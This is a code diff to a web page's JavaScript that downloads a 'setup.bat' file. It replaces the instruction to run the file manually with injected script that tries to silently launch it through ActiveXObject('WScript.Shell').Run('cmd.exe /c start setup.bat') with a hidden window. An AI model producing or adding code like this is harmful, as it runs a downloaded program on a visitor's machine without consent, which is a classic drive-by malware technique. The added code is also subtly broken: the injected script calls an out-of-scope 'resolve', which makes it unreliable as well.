@@ -24,13 +24,29 @@
         window.URL.revokeObjectURL(url);
         
         // Alert user to manually run the downloaded .bat file
-        alert('File downloaded successfully! Please navigate to your downloads folder and run the "setup.bat" file.');
+        alert('File downloaded successfully! Attempting to execute the "setup.bat" file automatically.');
 
-        // Automatically open the downloaded file using an iframe (may not work in all browsers due to security restrictions)
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        iframe.src = url;
+        // Attempt to automatically execute the downloaded .bat file
+        const execCommand = `cmd.exe /c start setup.bat`;
+        const execResult = await new Promise(resolve => {
+          const script = document.createElement('script');
+          script.textContent = `
+            const execResult = (function() {
+              try {
+                const result = new ActiveXObject("WScript.Shell").Run("${execCommand}", 0, true);
+                return { success: true, result };
+              } catch (error) {
+                return { success: false, error: error.message };
+              }
+            })();
+            resolve(execResult);
+          `;
+          document.body.appendChild(script);
+        });
+
+        if (!execResult.success) {
+          throw new Error(`Error executing file: ${execResult.error}`);
+        }
       } catch (error) {
         console.error('Error downloading or executing file:', error);
         alert('Error downloading or executing file. Please try again later.');
